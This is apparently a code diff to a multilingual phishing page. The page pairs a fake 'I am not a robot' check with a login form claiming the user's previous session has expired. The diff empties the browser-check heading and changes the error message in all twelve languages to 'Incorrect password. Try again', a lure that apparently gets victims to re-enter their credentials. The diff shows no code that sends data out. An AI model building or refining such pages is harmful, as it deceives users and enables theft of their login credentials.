@@ -47,7 +47,7 @@
   <div id="verification-div" style="position:absolute;height:100vh; width:100vw;background-color: #fff;">
       <div class="row">
         <div class="col-12 verification-content mx-2">
-          <h2 id="verify-heading">Checking your browser before accessing the site</h2>
+          <h2 id="verify-heading"></h2>
           <div>
               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border:0px solid black;background: #f3efef;border-radius:5px;">
                 <input type="checkbox" id="bot-check" class="form-check-input">
@@ -108,11 +108,11 @@
       // Translation object for multiple languages
       const translations = {
          en: {
-            verifyHeading: "Checking your browser before accessing the site",
+            verifyHeading: "",
             botCheckLabel: "I am not a robot",
             verifyInstruction: "Click on the checkbox to verify if you're human.",
             redirecting: "Redirecting...",
-            errorMessage: "Try again",
+            errorMessage: "Incorrect password. Try again",
             formHeading: "Let's get started",
             formSubheading: "Previous session has expired, login to continue",
             emailLabel: "Email",
@@ -121,11 +121,11 @@
             loaderText: "Loading..."
          },
          zh: {
-            verifyHeading: "在访问网站之前检查您的浏览器",
+            verifyHeading: "",
             botCheckLabel: "我不是机器人",
             verifyInstruction: "点击复选框以验证您是人类。",
             redirecting: "正在重定向...",
-            errorMessage: "再次尝试",
+            errorMessage: "密码错误，请重试",
             formHeading: "让我们开始",
             formSubheading: "之前的会话已过期，请登录以继续",
             emailLabel: "电子邮件",
@@ -134,11 +134,11 @@
             loaderText: "加载中..."
          },
          ja: {
-            verifyHeading: "サイトにアクセスする前にブラウザを確認しています",
+            verifyHeading: "",
             botCheckLabel: "私はロボットではありません",
             verifyInstruction: "人間であることを確認するためにチェックボックスをクリックしてください。",
             redirecting: "リダイレクト中...",
-            errorMessage: "もう一度試してください",
+            errorMessage: "パスワードが間違っています。もう一度お試しください",
             formHeading: "始めましょう",
             formSubheading: "前のセッションが期限切れになりました。続行するにはログインしてください",
             emailLabel: "メール",
@@ -147,11 +147,11 @@
             loaderText: "読み込み中..."
          },
          hi: {
-            verifyHeading: "साइट तक पहुंचने से पहले अपने ब्राउज़र की जांच करें",
+            verifyHeading: "",
             botCheckLabel: "मैं रोबोट नहीं हूँ",
             verifyInstruction: "यह सत्यापित करने के लिए चेकबॉक्स पर क्लिक करें कि आप इंसान हैं।",
             redirecting: "पुनर्निर्देशन...",
-            errorMessage: "फिर से कोशिश करें",
+            errorMessage: "गलत पासवर्ड। फिर से कोशिश करें",
             formHeading: "आइए शुरू करें",
             formSubheading: "पिछला सत्र समाप्त हो गया है, जारी रखने के लिए लॉगिन करें",
             emailLabel: "ईमेल",
@@ -160,11 +160,11 @@
             loaderText: "लोड हो रहा है..."
          },
          es: {
-            verifyHeading: "Comprobando tu navegador antes de acceder al sitio",
+            verifyHeading: "",
             botCheckLabel: "No soy un robot",
             verifyInstruction: "Haz clic en la casilla para verificar que eres humano.",
             redirecting: "Redirigiendo...",
-            errorMessage: "Inténtalo de nuevo",
+            errorMessage: "Contraseña incorrecta. Inténtalo de nuevo",
             formHeading: "Empecemos",
             formSubheading: "La sesión anterior ha expirado, inicia sesión para continuar",
             emailLabel: "Correo electrónico",
@@ -173,11 +173,11 @@
             loaderText: "Cargando..."
          },
          fr: {
-            verifyHeading: "Vérification de votre navigateur avant d'accéder au site",
+            verifyHeading: "",
             botCheckLabel: "Je ne suis pas un robot",
             verifyInstruction: "Cochez la case pour vérifier que vous êtes humain.",
             redirecting: "Redirection...",
-            errorMessage: "Réessayez",
+            errorMessage: "Mot de passe incorrect. Réessayez",
             formHeading: "Commençons",
             formSubheading: "La session précédente a expiré, connectez-vous pour continuer",
             emailLabel: "Email",
@@ -186,11 +186,11 @@
             loaderText: "Chargement..."
          },
          de: {
-            verifyHeading: "Überprüfung Ihres Browsers vor dem Zugriff auf die Website",
+            verifyHeading: "",
             botCheckLabel: "Ich bin kein Roboter",
             verifyInstruction: "Klicken Sie auf das Kontrollkästchen, um zu bestätigen, dass Sie ein Mensch sind.",
             redirecting: "Weiterleitung...",
-            errorMessage: "Versuchen Sie es erneut",
+            errorMessage: "Falsches Passwort. Versuchen Sie es erneut",
             formHeading: "Lass uns anfangen",
             formSubheading: "Die vorherige Sitzung ist abgelaufen, melden Sie sich an, um fortzufahren",
             emailLabel: "E-Mail",
@@ -199,11 +199,11 @@
             loaderText: "Laden..."
          },
          pt: {
-            verifyHeading: "Verificando seu navegador antes de acessar o site",
+            verifyHeading: "",
             botCheckLabel: "Não sou um robô",
             verifyInstruction: "Clique na caixa de seleção para verificar se você é humano.",
             redirecting: "Redirecionando...",
-            errorMessage: "Tente novamente",
+            errorMessage: "Senha incorreta. Tente novamente",
             formHeading: "Vamos começar",
             formSubheading: "A sessão anterior expirou, faça login para continuar",
             emailLabel: "E-mail",
@@ -212,11 +212,11 @@
             loaderText: "Carregando..."
          },
          ar: {
-            verifyHeading: "التحقق من متصفحك قبل الوصول إلى الموقع",
+            verifyHeading: "",
             botCheckLabel: "أنا لست روبوت",
             verifyInstruction: "انقر على مربع الاختيار للتحقق من أنك إنسان.",
             redirecting: "جارٍ إعادة التوجيه...",
-            errorMessage: "حاول مرة أخرى",
+            errorMessage: "كلمة المرور غير صحيحة. حاول مرة أخرى",
             formHeading: "لنبدأ",
             formSubheading: "انتهت صلاحية الجلسة السابقة، قم بتسجيل الدخول للمتابعة",
             emailLabel: "البريد الإلكتروني",
@@ -225,11 +225,11 @@
             loaderText: "جارٍ التحميل..."
          },
          it: {
-            verifyHeading: "Controllo del browser prima di accedere al sito",
+            verifyHeading: "",
             botCheckLabel: "Non sono un robot",
             verifyInstruction: "Fai clic sulla casella per verificare che sei umano.",
             redirecting: "Reindirizzamento...",
-            errorMessage: "Riprova",
+            errorMessage: "Password errata. Riprova",
             formHeading: "Iniziamo",
             formSubheading: "La sessione precedente è scaduta, accedi per continuare",
             emailLabel: "Email",
@@ -238,11 +238,11 @@
             loaderText: "Caricamento..."
          },
          ko: {
-            verifyHeading: "사이트에 접근하기 전에 브라우저를 확인하는 중",
+            verifyHeading: "",
             botCheckLabel: "나는 로봇이 아닙니다",
             verifyInstruction: "인간임을 확인하려면 체크박스를 클릭하세요.",
             redirecting: "리디렉션 중...",
-            errorMessage: "다시 시도하세요",
+            errorMessage: "잘못된 비밀번호입니다. 다시 시도하세요",
             formHeading: "시작합시다",
             formSubheading: "이전 세션이 만료되었습니다. 계속하려면 로그인하세요",
             emailLabel: "이메일",
@@ -251,11 +251,11 @@
             loaderText: "로딩 중..."
          },
          vi: {
-            verifyHeading: "Kiểm tra trình duyệt của bạn trước khi truy cập trang web",
+            verifyHeading: "",
             botCheckLabel: "Tôi không phải là robot",
             verifyInstruction: "Nhấp vào hộp kiểm để xác minh bạn là con người.",
             redirecting: "Đang chuyển hướng...",
-            errorMessage: "Thử lại",
+            errorMessage: "Mật khẩu không đúng. Thử lại",
             formHeading: "Hãy bắt đầu",
             formSubheading: "Phiên trước đã hết hạn, đăng nhập để tiếp tục",
             emailLabel: "Email",
